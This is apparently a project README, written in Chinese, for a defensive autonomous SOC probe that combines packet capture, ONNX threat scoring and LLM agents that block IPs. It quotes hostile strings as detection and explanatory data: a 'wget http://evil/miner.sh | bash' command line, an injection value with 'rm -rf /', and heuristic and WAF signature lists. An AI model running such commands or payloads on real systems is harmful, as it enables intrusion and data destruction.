# Aegis-Agent：自主 SOC 探针

![C++20](https://img.shields.io/badge/C++-20-blue.svg) ![eBPF](https://img.shields.io/badge/eBPF-XDP-black.svg) ![ONNX](https://img.shields.io/badge/AI-ONNX_Runtime-orange.svg) ![MCP](https://img.shields.io/badge/Protocol-MCP-green.svg) ![LangGraph](https://img.shields.io/badge/Agent-LangGraph-purple.svg)

一款将 **eBPF 纳秒级内核拦截**、**ET-BERT 边缘 AI 推理**与 **LLM 多智能体决策**三层能力融合在一起的自主安全运营中心（Autonomous SOC）探针。

---

## 整体架构

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                         Aegis-Agent 总体架构                                  │
│                                                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │  LAYER 3   Python 慢系统 — 多智能体 SOC (LangGraph)                  │   │
│   │                                                                     │   │
│   │  ┌─────────────┐  取证报告  ┌──────────────┐  决议  ┌───────────┐  │   │
│   │  │ Investigator│ ─────────► │  Commander   │ ──────► │  END      │  │   │
│   │  │  (Agent 1)  │            │  (Agent 2)   │         │           │  │   │
│   │  │  取证专员   │            │  安全指挥官  │         │ 结案报告  │  │   │
│   │  └──────┬──────┘            └──────┬───────┘         └───────────┘  │   │
│   │         │ MCP RPC                  │ RAG 检索                        │   │
│   │         │ tools/call               │ FAISS + 火山引擎 Embedding       │   │
│   └─────────┼──────────────────────────┼─────────────────────────────────┘   │
│             │  JSON-RPC 2.0 over HTTP  │                                      │
│   ──────────┼──────────────────────────┼──────────────────────────────────   │
│             │                          │ block_malicious_ip                   │
│   ┌─────────┼──────────────────────────┼─────────────────────────────────┐   │
│   │  LAYER 2   C++ 控制面 — Seastar MCP Server (port 8080)               │   │
│   │             ▲                      │                                  │   │
│   │   StdioTransport                   │                                  │   │
│   │   (seastar::thread，                │                                  │   │
│   │    直读 stdin/直写 stdout)           │                                  │   │
│   │                               ┌────▼─────────────────────────────┐   │   │
│   │                               │  MCP Tool Registry               │   │   │
│   │                               │  ┌──────────┐ ┌───────────────┐  │   │   │
│   │                               │  │ NetTools │ │   OSTools     │  │   │   │
│   │                               │  │/proc/net │ │/proc/PID/cmd  │  │   │   │
│   │                               │  │   /tcp   │ │    line       │  │   │   │
│   │                               │  └──────────┘ └───────────────┘  │   │   │
│   │                               │  ┌──────────────────────────┐    │   │   │
│   │                               │  │        SecTools          │    │   │   │
│   │                               │  │ eBPF map → iptables      │    │   │   │
│   │                               │  │ fork+execv (no injection)│    │   │   │
│   │                               │  └──────────────────────────┘    │   │   │
│   │                               └──────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│             ▲ JSON-RPC notifications/threat_detected (stdout)                │
│   ──────────┼────────────────────────────────────────────────────────────   │
│             │                                                                │
│   ┌─────────┼─────────────────────────────────────────────────────────┐     │
│   │  LAYER 1   C++ 数据面 — 独立线程 (永不退出)                        │     │
│   │             │                                                     │     │
│   │   PcapSniffer                FlowTracker              ONNXEngine  │     │
│   │   libpcap混杂模式            TTL-based 流重组          ET-BERT推理 │     │
│   │   Eth→IP→TCP 解析            512字节触发推理            ONNX C++ API│     │
│   │   src_ip + dst_port          cleanup_stale(60s)        heuristic  │     │
│   │        │                           │                   fallback   │     │
│   │        └───────────────────────────┘                              │     │
│   └─────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│   ┌──────────────────────────────────────────────┐                          │
│   │  LAYER 0   内核态防线 (可选) — eBPF/XDP        │                          │
│   │  网卡驱动层  BPF_MAP_UPDATE_ELEM               │                          │
│   │  黑名单查表  纳秒级 DROP，CPU 占用趋近 0%       │                          │
│   └──────────────────────────────────────────────┘                          │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 两路信息流

系统有两条完全独立的信息流，分别承担**上行告警**和**下行决策**：

```
  ┌──────────────────────────────────────────────────────────────────┐
  │  上行流：威胁事件 (C++ → Python)                                  │
  │                                                                  │
  │  PcapSniffer                                                     │
  │     │ raw packet                                                 │
  │     ▼                                                            │
  │  FlowTracker.process_packet()   ← 累积到 512 字节才触发          │
  │     │ assembled payload                                          │
  │     ▼                                                            │
  │  ONNXEngine.infer()             ← 优先真实模型，失败降级 heuristic │
  │     │ threat_score > 0.95                                        │
  │     ▼                                                            │
  │  write_mcp_message()            ← mutex 保护 cout，线程安全       │
  │     │ JSON-RPC notification (stdout)                             │
  │     ▼                                                            │
  │  CppProbeWrapper._message_pump()  ← Python daemon 线程读 stdout  │
  │     │ callback(ip, port, score)                                  │
  │     ▼                                                            │
  │  AlertDedup.should_process()    ← 60s 窗口去重，防 LLM 配额耗尽  │
  │     │ 首次告警                                                   │
  │     ▼                                                            │
  │  on_threat_detected() → LangGraph.invoke()                      │
  └──────────────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────────────┐
  │  下行流：封禁决议 (Python → C++ kernel)                          │
  │                                                                  │
  │  Commander Agent 调用 block_malicious_ip tool                    │
  │     │                                                            │
  │     ▼                                                            │
  │  CppProbeWrapper.call_tool()                                     │
  │     │ HTTP POST /message {"method":"tools/call",...}             │
  │     ▼                                                            │
  │  Seastar McpServer (port 8080)                                   │
  │     │ JsonRpcDispatcher → McpRegistry.call_tool()                │
  │     ▼                                                            │
  │  SecTools.execute()                                              │
  │     ├─ inet_pton() 验证 IP 格式                                  │
  │     ├─ 尝试 open("/sys/fs/bpf/aegis_blacklist")                  │
  │     │    ├─ 成功 → syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM)        │
  │     │    └─ 失败 → fork() + execv("/sbin/iptables", args[])      │
  │     └─ 返回 {"status":"success","method":"ebpf_xdp|iptables"}   │
  └──────────────────────────────────────────────────────────────────┘
```

---

## 模块详解

### Layer 1 — 数据面（C++ 独立线程）

#### PcapSniffer — 无侵入旁路抓包

```cpp
// src/capture/pcap_sniffer.hpp
// 原理：libpcap 混杂模式，pcap_loop() 永久阻塞，从 DMA 缓冲区零拷贝读取原始帧
pcap_t* handle = pcap_open_live(iface, 65535, /*promisc=*/1, 1000, errbuf);
pcap_loop(handle, 0,  // count=0 → 无限循环
    [](u_char* user, const pcap_pkthdr* hdr, const u_char* bytes) {
        // 解析 Ethernet → IP → TCP，提取 src_ip 和 dst_port
        // 将原始报文字节传递给 FlowTracker
    }, reinterpret_cast<u_char*>(&callback));
```

> **关键设计**：`start_capture()` 永不正常返回（除非 pcap 打开失败）。
> 数据面线程的 `ONNXEngine` 和 `FlowTracker` 对象因此**永远不会析构**，
> 避免了在非 Seastar 线程上调用 `operator delete` 破坏 Seastar 分配器的
> per-shard free-list（这是 Seastar 的核心约束）。

#### FlowTracker — TTL-based 流重组

```
  raw packet 1 (200B) ──►  FlowState.buffer = [200B]   last_seen = now
  raw packet 2 (200B) ──►  FlowState.buffer = [400B]   last_seen = now
  raw packet 3 (150B) ──►  FlowState.buffer = [550B]   → 触发！返回 payload
                                            erase(key)   释放内存

  每 1000 个包：
  cleanup_stale(60s) ──►  删除 last_seen > 60s 的僵尸流，防止扫描攻击导致 OOM
```

Hash 函数使用 Boost `hash_combine` 模式，避免简单 XOR 的高碰撞率：
```cpp
// src/capture/flow_tracker.hpp
auto combine = [&](size_t v) {
    seed ^= v + 0x9e3779b9 + (seed << 6) + (seed >> 2);  // 黄金比例扰动
};
combine(hash<uint32_t>()(k.src_ip));
combine(hash<uint32_t>()(k.dst_ip));
combine(hash<uint16_t>()(k.src_port));
// ...
```

#### ONNXEngine — 双路推理 + 优雅降级

```
payload (512 bytes)
    │
    ▼
[tokenize()]  byte-level BERT 编码
    │
    │  每字节 b → token_id = b + 3
    │  [CLS]=1  [SEP]=2  [PAD]=0
    │  padding 至 max_len=512
    │
    ├── input_ids:      [1, b1+3, b2+3, ..., 2, 0, 0, ...]  shape [1, 512]
    └── attention_mask: [1,   1,    1,  ..., 1, 0, 0, ...]  shape [1, 512]
                               │
                               ▼
                    session_->Run(...)    ← ONNX C++ API，I/O 名称在 load 时缓存
                               │
                               ▼
                         logits output
                               │
                    ┌──────────┴──────────┐
              n_class=1                n_class>1
          sigmoid(logits[0])     softmax → P(threat) = exp(last) / Σexp
                               │
                    threat_score ∈ [0.0, 1.0]
                               │
              加载失败或推理异常 → heuristic_score()
              匹配 "wget ","curl ","/bin/bash","miner.sh" 等特征字符串
```

> **I/O 名称缓存**（`load_model()` 时调用一次，推理时直接用指针）：
> ```cpp
> // src/inference/onnx_engine.cpp
> input_names_.push_back(session_->GetInputNameAllocated(i, alloc).get());
> input_name_ptrs_.push_back(input_names_.back().c_str());
> // 推理时直接传 input_name_ptrs_.data()，无运行时查询开销
> ```

---

### Layer 2 — 控制面（Seastar 协程）

#### 线程模型与 IPC 设计

```
  进程内共 3 条执行路径（完全隔离，无共享 Seastar 对象）：

  ┌─────────────────────────────────────────────────────┐
  │  Seastar Reactor 线程（主线程）                      │
  │  • 运行 McpServer HTTP 服务 (port 8080)              │
  │  • 处理所有 HTTP accept/read/write（协程，无阻塞）   │
  │  • 接收 SIGINT/SIGTERM → co_await server->stop()    │
  │  ⚠ 所有 Seastar 对象只能在此线程访问                │
  └─────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────┐
  │  StdioTransport（seastar::thread，可正常 join）      │
  │  • 在 Seastar 纤程内读 stdin / 写 stdout            │
  │  • 通过 shards.local().dispatch() 分发请求          │
  │  • server->stop() 时自动 join，不会与 Reactor 冲突  │
  └─────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────┐
  │  data_plane 线程（detached，永久存活）               │
  │  • pcap_loop() 永久阻塞                              │
  │  • 威胁告警写入 stdout（mutex 保护）                 │
  │  • 若 pcap 失败：sleep(hours) 保持存活              │
  │  ⚠ 线程必须永不退出，否则本地对象析构 → 分配器崩溃   │
  └─────────────────────────────────────────────────────┘

  安全退出：co_await server->stop()（StdioTransport 可 join，data_plane 处于 sleep 不冲突）
```

#### MCP Server 请求路由

```
  HTTP POST /message
  {"jsonrpc":"2.0","id":1,"method":"tools/call",
   "params":{"name":"block_malicious_ip","arguments":{"ip":"1.2.3.4"}}}
          │
          ▼
  JsonRpcDispatcher.handle_request()
          │
          ├── "tools/list"  → registry.get_tools_list()   返回所有 Tool Schema
          ├── "tools/call"  → registry.call_tool(name, args) → Tool.execute()
          ├── "initialize"  → 声明 MCP 协议版本和 capabilities
          └── "ping"        → {}
```

#### MCP Tools 内核接口

| Tool | 实现原理 | 输入 | 输出 |
|------|----------|------|------|
| `get_pid_by_connection` | 解析 `/proc/net/tcp`（十六进制 IP:Port），遍历 `/proc/<PID>/fd/` 匹配 socket inode | `ip`, `port` | `pid` |
| `analyze_process_behavior` | 读取 `/proc/<PID>/cmdline`（NUL 分隔符替换为空格） | `pid` | `cmdline` |
| `block_malicious_ip` | `inet_pton` 验证 → eBPF map syscall → `fork+execv iptables` fallback | `ip` | `status`, `method` |

**SecTools 无注入封禁设计**：
```cpp
// src/mcp_server/tools/sec_tools.cpp
// 方案1：原生 BPF syscall，无 shell，无注入面
union bpf_attr attr{};
attr.map_fd = map_fd;
attr.key    = reinterpret_cast<__u64>(&target_ip);
attr.value  = reinterpret_cast<__u64>(&value);
::syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

// 方案2 fallback：fork+execv，参数是字符串数组，无 shell 解析
pid_t pid = fork();
if (pid == 0) {
    const char* args[] = {
        "/sbin/iptables", "-w", "-A", "INPUT",
        "-s", ip.c_str(), "-j", "DROP", nullptr
    };
    execv("/sbin/iptables", const_cast<char**>(args));
    _exit(1);  // execv 失败时子进程干净退出
}
waitpid(pid, &status, 0);
// 对比不安全的方案：system("iptables -A INPUT -s " + ip)
// 攻击者可构造 ip = "1.2.3.4; rm -rf /" 实现注入
```

---

### Layer 3 — Python 多智能体 SOC

#### LangGraph 工作流

```
  ┌──────────────────────────────────────────────────────────────┐
  │  START                                                       │
  │    │ initial_state = {threat_ip, threat_port, "", ""}        │
  │    ▼                                                         │
  │  investigator_node                                           │
  │    │ • create_react_agent(LLM, [get_pid, analyze_process])   │
  │    │ • LLM ReAct 循环：Thought → Action → Observation        │
  │    │   Action1: get_pid_by_connection(ip, port) → pid=8901   │
  │    │   Action2: analyze_process_behavior(8901) → cmdline     │
  │    │ • 输出取证报告 → state.investigation_report              │
  │    ▼                                                         │
  │  commander_node                                              │
  │    │ • RAG 召回：FAISS.similarity_search(report, k=2)        │
  │    │   返回相关 MITRE ATT&CK 条目作为 context                │
  │    │ • create_react_agent(LLM, [block_malicious_ip])         │
  │    │ • LLM 综合研判：report + RAG context → 决议             │
  │    │   若认定高危 → 调用 block_malicious_ip(ip)              │
  │    │ • 输出战报 → state.decision                             │
  │    ▼                                                         │
  │  END                                                         │
  └──────────────────────────────────────────────────────────────┘
```

#### AlertDedup — 60s 滑动窗口去重

```python
# scripts/multi_agent_soc.py
class AlertDedup:
    """防止同一 IP 在短时间内重复触发 LLM 调用，保护 API 配额"""
    def should_process(self, ip: str) -> bool:
        now = time.time()
        with self._lock:
            last = self._seen.get(ip, 0.0)
            if now - last < self._window:   # 60s 内已处理过
                return False
            self._seen[ip] = now
            # 懒清理：顺带删除 10 倍窗口外的过期条目，防止长期运行内存增长
            cutoff = now - self._window * 10
            self._seen = {k: v for k, v in self._seen.items() if v > cutoff}
            return True
```

#### RAG 威胁情报检索

```
  investigation_report (取证文本)
          │
          ▼
  VolcengineMultimodalEmbeddings.embed_query()
  → HTTP POST /embeddings/multimodal (火山引擎 Doubao API)
  → 返回 1024-dim 向量
          │
          ▼
  FAISS.similarity_search(query_vector, k=2)
  → 从本地向量库召回最相似的 2 条威胁情报
    • MITRE T1059.004: /bin/bash 执行恶意脚本
    • MITRE T1105: wget/curl 下载并 pipe 执行
    • MITRE T1562: chmod +x 赋权
    • IOC: 443 端口高频连接 + wget = C2 心跳
          │
          ▼
  RAG context 注入 Commander prompt
  → 引导 LLM 做有据可查的决策，而非幻觉
```

---

### WAF 旁挂扩展（可选）

```
  外部请求 (port 8000)
          │
          ▼
  waf_proxy.py (FastAPI 反向代理)
          │
          ├── 快速路径：签名规则匹配
          │   "union select" → 0.99  (SQL 注入)
          │   "<script>"     → 0.98  (XSS)
          │   "/etc/passwd"  → 0.99  (路径遍历)
          │
          └── AI 路径：ET-BERT ONNX 推理
              byte-level tokenize → ort_session.run()
              → softmax P(threat)
                    │
          score > 0.95 → 403 拒绝 + 写入 waf_alerts.log
          score ≤ 0.95 → httpx 透明转发到后端
```

---

## 目录结构

```
aegis-agent/
├── src/
│   ├── main.cpp                        # 进程总成：3 线程调度 + Seastar 启动
│   ├── capture/
│   │   ├── pcap_sniffer.hpp            # libpcap 旁路抓包，永久阻塞
│   │   ├── flow_tracker.{hpp,cpp}      # TTL-based 流重组 + 内存泄漏防护
│   │   └── tokenizer.{hpp,cpp}         # (预留) 独立 tokenizer 模块
│   ├── inference/
│   │   └── onnx_engine.{hpp,cpp}       # ET-BERT 推理：真实 ONNX + heuristic fallback
│   ├── mcp_server/tools/
│   │   ├── net_tools.{hpp,cpp}         # /proc/net/tcp → PID 溯源
│   │   ├── os_tools.{hpp,cpp}          # /proc/PID/cmdline → 进程行为分析
│   │   └── sec_tools.{hpp,cpp}         # eBPF map + fork+execv iptables 封禁
│   └── ebpf/
│       └── xdp_loader.{hpp,cpp}        # libbpf XDP 程序加载（可选编译）
├── third_party/
│   ├── MCP-Server/                     # Seastar HTTP + JSON-RPC 2.0 框架
│   │   ├── include/mcp/mcp.hh          # SDK 单一公共入口
│   │   ├── include/mcp/core/           # McpTool / McpResource / McpPrompt 抽象接口 + Registry + Builder
│   │   ├── include/mcp/transport/      # StdioTransport / HttpSseTransport / StreamableHttpTransport
│   │   ├── include/mcp/server/         # McpServer + McpShard（sharded 多核架构）
│   │   └── src/mcp/server/             # mcp_server.cc + seastar_patches/
│   └── onnxruntime/                    # ONNX Runtime C++ API（本地绿色安装）
├── models/
│   ├── et_bert_dummy.onnx              # 模型元数据（小文件）
│   └── et_bert_dummy.onnx.data         # 模型权重（约 146MB）
├── scripts/
│   └── multi_agent_soc.py             # Python SOC：LangGraph + RAG + AlertDedup
├── waf/
│   └── waf_proxy.py                   # FastAPI WAF 反向代理（可选）
├── CMakeLists.txt                      # C++20 构建，可选 libbpf
└── requirements.txt                   # Python 依赖
```

---

## 环境变量

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `AEGIS_INTERFACE` | `ens33` | 监听网卡名 |
| `AEGIS_MCP_PORT` | `8080` | MCP HTTP+SSE 服务端口 |
| `AEGIS_MODEL` | `models/et_bert_dummy.onnx` | ONNX 模型路径 |
| `AEGIS_THRESHOLD` | `0.95` | 触发告警的威胁评分阈值 |
| `AEGIS_DEDUP_WINDOW` | `60` | 告警去重窗口（秒） |
| `AEGIS_NO_DATAPLANE` | 未设置 | 设为任意值跳过数据面（测试用） |
| `MODEL_NAME` | `deepseek-chat` | Python Agent 使用的 LLM 模型名 |
| `OPENAI_API_KEY` | 必填 | LLM API Key（兼容 OpenAI SDK） |
| `OPENAI_BASE_URL` | 必填 | API 端点（DeepSeek / 火山引擎等） |
| `EMBEDDING_MODEL_NAME` | `doubao-embedding-vision-251215` | RAG 向量化模型（火山引擎 Endpoint ID） |
| `WAF_MODEL_PATH` | `../models/et_bert_dummy.onnx` | WAF ONNX 模型路径 |

---

## 编译与运行

### 依赖

- Linux kernel ≥ 5.10（eBPF XDP 可选需要 ≥ 5.15）
- GCC ≥ 11 或 Clang ≥ 14，C++20
- CMake ≥ 3.17
- `libpcap-dev`、`nlohmann-json`、`Seastar`（`find_package` 方式安装）
- ONNX Runtime C++ ≥ 1.18（解压至 `third_party/onnxruntime/`）
- Python ≥ 3.12，依赖见 `requirements.txt`

### 构建 C++ 探针

```bash
mkdir build && cd build
cmake ..
make -j$(nproc)
```

### 运行

```bash
# 需要 root 权限（libpcap 混杂模式 + iptables）
sudo LD_LIBRARY_PATH=third_party/onnxruntime/lib \
    AEGIS_INTERFACE=eth0 \
    ./build/aegis_agent --smp 1

# 仅启动 MCP Server（测试，不抓包）
AEGIS_NO_DATAPLANE=1 LD_LIBRARY_PATH=third_party/onnxruntime/lib \
    ./build/aegis_agent --smp 1
```

### 启动 Python SOC 大脑

```bash
pip install -r requirements.txt

export OPENAI_API_KEY="your-key"
export OPENAI_BASE_URL="https://api.deepseek.com"

python scripts/multi_agent_soc.py
```

### 可选：启动 WAF 旁挂

```bash
cd waf
WAF_MODEL_PATH=../models/et_bert_dummy.onnx \
    uvicorn waf_proxy:app --host 0.0.0.0 --port 8000
```

---

## 实战响应时序（以 Log4Shell 挖矿为例）

```
T+0ms    网卡收到报文，libpcap DMA 复制到用户空间缓冲区
T+1ms    FlowTracker 累积至 512B，触发 ONNXEngine.infer()
T+3ms    ET-BERT 前向传播完成，score=0.99 > 0.95，触发告警
T+5ms    write_mcp_message() 向 stdout 输出 JSON-RPC notification
T+10ms   Python CppProbeWrapper._message_pump() 读到告警
T+10ms   AlertDedup 放行（首次），LangGraph.invoke() 启动
T+1s     Investigator Agent 调用 get_pid_by_connection
         C++ 扫描 /proc/net/tcp → inode 匹配 → 返回 pid=8901
T+2s     Investigator Agent 调用 analyze_process_behavior(8901)
         C++ 读 /proc/8901/cmdline → "wget http://evil/miner.sh | bash"
T+3s     Commander Agent RAG 召回 MITRE T1105，综合研判
T+4s     Commander 调用 block_malicious_ip("x.x.x.x")
         C++ SecTools: syscall(BPF_MAP_UPDATE_ELEM) → 写入 XDP 黑名单
T+5s     后续所有该 IP 报文在网卡驱动层即丢弃（无 CPU 上下文切换）
T+5s     LangGraph 输出结案战报，含 IOC + 攻击链路 + 处置结果
```

**MTTR（平均响应时间）：从 30 分钟 → 5 秒**
